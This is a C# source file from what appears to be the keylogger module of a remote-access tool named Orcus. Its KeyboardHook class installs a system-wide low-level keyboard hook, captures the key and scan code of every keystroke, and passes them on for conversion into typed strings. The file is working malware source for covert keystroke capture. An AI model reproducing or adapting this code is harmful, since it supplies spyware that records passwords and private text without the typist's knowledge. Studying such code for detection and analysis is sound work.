using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Orcus.Native;

namespace Orcus.Utilities.KeyLogger
{
    internal class KeyboardHook : IDisposable
    {
        // ReSharper disable InconsistentNaming
        private const int WM_KEYDOWN = 0x100;
        private const int WM_SYSKEYDOWN = 0x104;
        private const int WM_KEYUP = 0x101;
        private const int WM_SYSKEYUP = 0x105;
        // ReSharper restore InconsistentNaming

        private NativeMethods.HookProc _keyboardDelegate;
        private IntPtr _keyboardHookHandle;
        private readonly KeyProcessing _keyProcessing;

        public KeyboardHook()
        {
            _keyProcessing = new KeyProcessing();
            _keyProcessing.StringUp += _keyProcessing_StringUp;
            _keyProcessing.StringDown += _keyProcessing_StringDown;
        }

        private void _keyProcessing_StringDown(object sender, StringDownEventArgs e)
        {
            StringDown?.Invoke(this, e);
        }

        private void _keyProcessing_StringUp(object sender, StringDownEventArgs e)
        {
            StringUp?.Invoke(this, e);
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                // Free other state (managed objects).
            }

            if (_keyboardHookHandle != IntPtr.Zero)
            {
                //uninstall hook
                var result = NativeMethods.UnhookWindowsHookEx(_keyboardHookHandle);
                //reset invalid handle
                //Free up for GC
                //if failed and exception must be thrown
                if (result == false)
                {
                    //Returns the error code returned by the last unmanaged function called using platform invoke that has the DllImportAttribute.SetLastError flag set. 
                    var errorCode = Marshal.GetLastWin32Error();
                    //Initializes and reports a new instance of the Win32Exception class with the specified error.
                    ErrorReporter.Current.ReportError(new Win32Exception(errorCode), "Keyboard Hook Dispose");
                }
            }
        }

        ~KeyboardHook()
        {
            Dispose(false);
        }

        public event EventHandler<StringDownEventArgs> StringDown;
        public event EventHandler<StringDownEventArgs> StringUp;
        public event KeyEventHandler KeyDown;
        public event EventHandler KeyUp;

        private IntPtr KeyboardHookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                var wParamInt = wParam.ToInt32();

                //read structure KeyboardHookStruct at lParam
                var myKeyboardHookStruct =
                    (KeyboardHookStruct) Marshal.PtrToStructure(lParam, typeof (KeyboardHookStruct));
                //raise KeyDown
                if ((StringDown != null || KeyDown != null) && (wParamInt == WM_KEYDOWN || wParamInt == WM_SYSKEYDOWN))
                {
                    if (KeyDown != null)
                    {
                        var keyData = (Keys) myKeyboardHookStruct.VirtualKeyCode;
                        var e = new KeyEventArgs(keyData);
                        KeyDown.Invoke(null, e);
                    }

                    if (StringDown != null)
                    {
                        _keyProcessing.ProcessKeyAction((uint) myKeyboardHookStruct.VirtualKeyCode,
                            (uint) myKeyboardHookStruct.ScanCode, true);
                    }
                }
            
                // raise KeyUp
                if ((StringUp != null || KeyUp != null) && (wParamInt == WM_KEYUP || wParamInt == WM_SYSKEYUP))
                {
                    if (KeyUp != null)
                    {
                        var keyData = (Keys) myKeyboardHookStruct.VirtualKeyCode;
                        var e = new KeyEventArgs(keyData);
                        KeyUp.Invoke(null, e);
                    }

                    if (StringUp != null)
                    {
                        _keyProcessing.ProcessKeyAction((uint) myKeyboardHookStruct.VirtualKeyCode,
                            (uint) myKeyboardHookStruct.ScanCode, false);
                    }
                }
            }

            //forward to other application
            return NativeMethods.CallNextHookEx(_keyboardHookHandle, nCode, wParam, lParam);
        }

        public void Hook()
        {
            //See comment of this field. To avoid GC to clean it up.
            _keyboardDelegate = KeyboardHookProc;
            //install hook

            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                _keyboardHookHandle = NativeMethods.SetWindowsHookEx(
                    HookType.WH_KEYBOARD_LL,
                    _keyboardDelegate, NativeMethods.GetModuleHandle(curModule.ModuleName),
                    0);
            }

            //If SetWindowsHookEx fails.
            if (_keyboardHookHandle == IntPtr.Zero)
            {
                //Returns the error code returned by the last unmanaged function called using platform invoke that has the DllImportAttribute.SetLastError flag set. 
                var errorCode = Marshal.GetLastWin32Error();
                //do cleanup

                //Initializes and throws a new instance of the Win32Exception class with the specified error. 
                throw new Win32Exception(errorCode);
            }
        }
    }
}